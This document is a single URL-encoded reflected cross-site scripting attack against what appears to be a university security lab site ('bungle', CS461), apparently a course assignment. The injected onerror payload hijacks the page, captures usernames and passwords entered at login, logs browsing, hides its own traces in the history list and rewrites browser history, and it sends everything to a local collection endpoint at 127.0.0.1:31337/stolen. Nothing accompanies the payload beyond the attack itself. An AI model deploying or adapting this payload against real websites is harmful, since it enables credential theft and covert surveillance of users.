http://bungle-cs461.cs.illinois.edu/search?xssdefense=3&q=%3Caudio%20src%3D%27imagedoesnotexist%27%20onerror%3D%27function%20payload(attacker)%20%7B%0A%20%20%20%20function%20log(attacker%2C%20data)%20%7B%20%0A%20%20%20%20%20%20%20%20console.log(%24.param(data))%3B%0A%20%20%20%20%20%20%20%20%24.get(attacker%2C%20data)%3B%0A%20%20%20%20%7D%0A%20%20%20%20function%20proxy(href%2C%20data)%20%7B%0A%20%20%20%20%20%20%20%20%24(%22html%22).hide()%3B%0A%20%20%20%20%20%20%20%20%24(%22html%22).load(href%2C%20data%2C%20function()%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24(%22html%22).show()%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20if%20(%24(%22%23logged-in-user%22).length%20!%3D%200)%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20log(attacker%2C%20%7B%22event%22%3A%20%22nav%22%2C%20%22user%22%3A%20%24(%22%23logged-in-user%22).html()%2C%20%22url%22%3A%20href%7D)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20else%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20log(attacker%2C%20%7B%22event%22%3A%20%22nav%22%2C%20%22url%22%3A%20href%7D)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%2F%2F%24(%22%23query%22).val(%22pwned!%22)%3B%20%20%20%0A%20%20%20%20%20%20%20%20%20%20%20%20addEvents()%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20if(href.indexOf(%22search%22)%20%3D%3D%20-1%20%26%26%20href%20!%3D%20%22.%2F%22)%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20history.replaceState(%7B%22html%22%3A%20%24(%22html%22).html()%7D%2C%20null%2C%20%22http%3A%2F%2Fbungle-cs461.cs.illinois.edu%2F%22)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20else%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20history.pushState(%7B%22html%22%3A%20%24(%22html%22).html()%7D%2C%20null%2C%20href)%3B%0A%20%20%20%20%20%20%20%20%7D)%3B%0A%20%20%20%20%7D%0A%20%20%20%20function%20addEvents()%7B%0A%20%20%20%20%20%20%20%20%2F%2F%20Set%20event%20for%20login%20botton%0A%20%20%20%20%20%20%20%20function%20loginOrCreate(target)%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20var%20username%20%3D%20%24(%22%23username%22).val()%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20var%20password%20%3D%20%24(%22%23userpass%22).val()%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%2F%2F%20Spy%0A%20%20%20%20%20%20%20%20%20%20%20%20log(attacker%2C%20%7B%22event%22%3A%20%22login%22%2C%20%22user%22%3A%20username%2C%20%22pass%22%3A%20password%7D)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%2F%2F%20Track%0A%20%20%20%20%20%20%20%20%20%20%20%20proxy(target%2C%20%7B%22username%22%3A%20username%2C%20%22password%22%3A%20password%7D)%3B%0A%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20%20%20%0A%20%20%20%20%20%20%20%20%24(%22%23log-in-btn%22).click(function(e)%7B%20%20%20%20%0A%20%20%20%20%20%20%20%20%20%20%20%20e.preventDefault()%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20var%20target%20%3D%20%24(this).attr(%22formaction%22)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20loginOrCreate(target)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%7D)%3B%0A%20%20%20%20%20%20%20%20%24(%22%23new-account-btn%22).click(function(e)%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20e.preventDefault()%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20var%20target%20%3D%20%24(this).attr(%22formaction%22)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20loginOrCreate(target)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%7D)%3B%0A%20%20%20%20%20%20%20%20%24(%22%23log-out-btn%22).click(function(e)%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20e.preventDefault()%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20var%20target%20%3D%20%24(this).parent().attr(%22action%22)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20log(attacker%2C%20%7B%22event%22%3A%20%22logout%22%2C%20%22user%22%3A%20%24(%22%23logged-in-user%22).html()%7D)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20proxy(target%2C%20%7B%7D)%0A%20%20%20%20%20%20%20%20%20%20%20%20%7D)%3B%0A%20%20%20%20%20%20%20%20%24(%22%23search-btn%22).click(function(e)%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20e.preventDefault()%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20var%20target%20%3D%20%24(this).parent().attr(%22action%22)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20proxy(target%20%2B%20%22%3Fq%3D%22%20%2B%20%24(%22%23query%22).val()%2C%20null)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%7D)%3B%0A%20%20%20%20%20%20%20%20%24(%22%23search-again-btn%22).click(function(e)%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20e.preventDefault()%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20var%20target%20%3D%20%24(this).attr(%22href%22)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20proxy(target%2C%20null)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%7D)%3B%0A%20%20%20%20%20%20%20%20%24(%22%23history-list%20a%22).each(function()%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20if(%24(this).attr(%22href%22).indexOf(%22attacker%22)%20%3E%3D%200)%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%24(this).hide()%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%7D)%3B%0A%20%20%20%20%20%20%20%20%24(%22%23history-list%20a%22).click(function(e)%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20e.preventDefault()%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20var%20target%20%3D%20%24(this).attr(%22href%22)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20proxy(target%2C%20null)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%7D)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%0A%20%20%20%20%20%20%20%20%2F%2F%20Deal%20with%20back%20and%20forward%0A%20%20%20%20%20%20%20%20window.onpopstate%20%3D%20function(e)%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24(%22html%22).html(e.state.html)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20addEvents()%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20if%20(%24(%22%23logged-in-user%22).length%20!%3D%200)%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20log(attacker%2C%20%7B%22event%22%3A%20%22nav%22%2C%20%22user%22%3A%20%24(%22%23logged-in-user%22).html()%2C%20%22url%22%3A%20window.location.pathname%20%2B%20window.location.search%7D)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20else%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20log(attacker%2C%20%7B%22event%22%3A%20%22nav%22%2C%20%22url%22%3A%20window.location.pathname%20%2B%20window.location.search%7D)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%7D%3B%0A%20%20%20%20%7D%0A%20%20%20%20proxy(%22.%2F%22%2C%20null)%3B%0A%7D%3Bpayload(%22http%3A%2F%2F127.0.0.1%3A31337%2Fstolen%22)%3B%27%2F%3E
